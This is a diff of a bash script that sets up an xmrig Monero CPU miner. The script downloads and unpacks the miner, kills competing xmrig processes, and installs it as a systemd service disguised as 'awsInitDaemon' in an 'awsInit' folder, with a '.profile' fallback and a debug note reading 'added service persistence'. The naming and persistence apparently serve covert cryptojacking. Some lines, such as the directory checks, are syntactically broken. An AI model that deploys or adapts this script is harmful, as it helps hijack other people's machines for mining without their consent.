@@ -9,7 +9,7 @@ echo "(please report issues to support@moneroocean.stream email with full output
 echo
 
 if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not adviced to run this script under root"
+    echo "WARNING: Generally it is not adviced to run this script under root"
 fi
 
 # command line arguments
@@ -20,16 +20,16 @@ EMAIL=$3 # this one is optional
 # checking prerequisites
 
 if [ -z $WALLET ]; then
-  echo "Script usage:"
-  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
-  echo "ERROR: Please specify your wallet address"
-  exit 1
+    echo "Script usage:"
+    echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
+    echo "ERROR: Please specify your wallet address"
+    exit 1
 fi
 
 WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
 if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
-  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
-  exit 1
+    echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
+        exit 1
 fi
 
 check_docker_container() {
@@ -40,15 +40,14 @@ check_docker_container() {
     return 1
 }
 
-working_dir=""
 
 if ! type curl >/dev/null; then
-  echo "ERROR: This script requires \"curl\" utility to work correctly"
-  exit 1
+    echo "ERROR: This script requires \"curl\" utility to work correctly"
+    exit 1
 fi
 
 if ! type lscpu >/dev/null; then
-  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
+    echo "WARNING: This script requires \"lscpu\" utility to work correctly"
 fi
 
 #if ! sudo -n true 2>/dev/null; then
@@ -66,10 +65,18 @@ check_docker() {
     return 1
 }
 
-# Determine working directory
+write_info() {
+    if [ "$DEBUG" = true ]; then
+        local value="$1"
+        if [ -n "$value" ]; then
+            echo $value >> info_pers
+        fi
+    fi
+}
+
 determine_working_dir() {
     if [ -n "$HOME" ]; then
-        return "$HOME"
+        echo "$HOME"
     else
         output=$(find /home -type d -writable 2>/dev/null | grep -v -E "^(/tmp|/proc|/sys|/dev)" | grep -v "tmp")
         if [ -z "$output" ]; then
@@ -81,70 +88,66 @@ determine_working_dir() {
                 fi
             fi
         fi
-        return $(echo "$output" | head -1)
+        echo $(echo "$output" | head -1)
     fi
 }
+
+working_dir=$(determine_working_dir)
 
 # Check free RAM
 check_free_ram() {
     FREE_RAM=$(free -m | awk '/^Mem:/{print $7}')
     if [ "$FREE_RAM" -lt 512 ]; then
         sed -i 's/"algo": *null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
+        write_info "cn-pico selected"
     elif [ "$FREE_RAM" -lt 2350 ]; then
         sed -i 's/"algo": *null/"algo": "rx/wow"/' "$working_dir/moneroocean/config.json"
+        write_info "rx/wow selected"
     fi
 }
 
-write_info() {
-    if [ "$DEBUG" = true ]; then
-        local value="$1"
-        if [ -n "$value" ]; then
-            echo $value >> info_pers
-        fi
-    fi
-}
 
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate"
-  exit 1
+    echo "ERROR: Can't compute projected Monero CN hashrate"
+    exit 1
 fi
 
 power2() {
-  if ! type bc >/dev/null; then
-    if   [ "$1" -gt "8192" ]; then
-      echo "8192"
-    elif [ "$1" -gt "4096" ]; then
-      echo "4096"
-    elif [ "$1" -gt "2048" ]; then
-      echo "2048"
-    elif [ "$1" -gt "1024" ]; then
-      echo "1024"
-    elif [ "$1" -gt "512" ]; then
-      echo "512"
-    elif [ "$1" -gt "256" ]; then
-      echo "256"
-    elif [ "$1" -gt "128" ]; then
-      echo "128"
-    elif [ "$1" -gt "64" ]; then
-      echo "64"
-    elif [ "$1" -gt "32" ]; then
-      echo "32"
-    elif [ "$1" -gt "16" ]; then
-      echo "16"
-    elif [ "$1" -gt "8" ]; then
-      echo "8"
-    elif [ "$1" -gt "4" ]; then
-      echo "4"
-    elif [ "$1" -gt "2" ]; then
-      echo "2"
-    else
-      echo "1"
+    if ! type bc >/dev/null; then
+        if   [ "$1" -gt "8192" ]; then
+            echo "8192"
+        elif [ "$1" -gt "4096" ]; then
+            echo "4096"
+        elif [ "$1" -gt "2048" ]; then
+            echo "2048"
+        elif [ "$1" -gt "1024" ]; then
+            echo "1024"
+        elif [ "$1" -gt "512" ]; then
+            echo "512"
+        elif [ "$1" -gt "256" ]; then
+            echo "256"
+        elif [ "$1" -gt "128" ]; then
+            echo "128"
+        elif [ "$1" -gt "64" ]; then
+            echo "64"
+        elif [ "$1" -gt "32" ]; then
+            echo "32"
+        elif [ "$1" -gt "16" ]; then
+            echo "16"
+        elif [ "$1" -gt "8" ]; then
+            echo "8"
+        elif [ "$1" -gt "4" ]; then
+            echo "4"
+        elif [ "$1" -gt "2" ]; then
+            echo "2"
+        else
+            echo "1"
+        fi
+    else 
+        echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
     fi
-  else 
-    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
-  fi
 }
 
 PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
@@ -152,13 +155,13 @@ PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
 PORT=$(( 10000 + $PORT ))
 if [ -z $PORT ]; then
-  echo "ERROR: Can't compute port"
-  exit 1
+    echo "ERROR: Can't compute port"
+    exit 1
 fi
 
 if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
-  echo "ERROR: Wrong computed port value: $PORT"
-  exit 1
+    echo "ERROR: Wrong computed port value: $PORT"
+    exit 1
 fi
 
 
@@ -168,14 +171,14 @@ echo "I will download, setup and run in background Monero CPU miner."
 echo "If needed, miner in foreground can be started by $working_dir/moneroocean/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
+    echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
 fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your $working_dir/.profile file first time you login this host after reboot."
+    echo "Since I can't do passwordless sudo, mining in background will started from your $working_dir/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using moneroocean_miner systemd service."
+    echo "Mining in background will be performed using moneroocean_miner systemd service."
 fi
 
 echo
@@ -230,11 +233,13 @@ check_system_libc() {
 #       fi
 #       exit 1
 
-determine_working_dir
 
 echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop awsInitDaemon.service
+    sudo systemctl stop moneroocean_miner.service
+    sudo systemctl disable --now moneroocean_miner.service
+
+    sudo systemctl stop awsInitDaemon.service
 fi
 killall -9 xmrig
 
@@ -252,8 +257,8 @@ if [ "$libc_type" = "musl" ]; then
     echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
     [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
-      echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
-      exit 1
+        echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
+        exit 1
     fi
     rm /tmp/data.tar.gz
 
@@ -271,15 +276,15 @@ if [ "$libc_type" = "musl" ]; then
 else
     echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
     if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
-      echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
-      exit 1
+        echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
+        exit 1
     fi
 
     echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
     [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
-      echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
-      exit 1
+        echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
+        exit 1
     fi
     rm /tmp/data.tar.gz
 
@@ -396,14 +401,14 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/awsInitDaemon.service /etc/systemd/system/awsInitDaemon.service
-    echo "[*] Starting moneroocean_miner systemd service"
-    sudo killall xmrig 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable awsInitDaemon.service
-    sudo systemctl start awsInitDaemon.service
-    echo "To see miner service logs run \"sudo journalctl -u awsInitDaemon -f\" command"
-    write_info "added service persistence"
+sudo mv /tmp/awsInitDaemon.service /etc/systemd/system/awsInitDaemon.service
+echo "[*] Starting moneroocean_miner systemd service"
+sudo killall xmrig 2>/dev/null
+sudo systemctl daemon-reload
+sudo systemctl enable awsInitDaemon.service
+sudo systemctl start awsInitDaemon.service
+echo "To see miner service logs run \"sudo journalctl -u awsInitDaemon -f\" command"
+write_info "added service persistence"
         fi
     fi
 fi
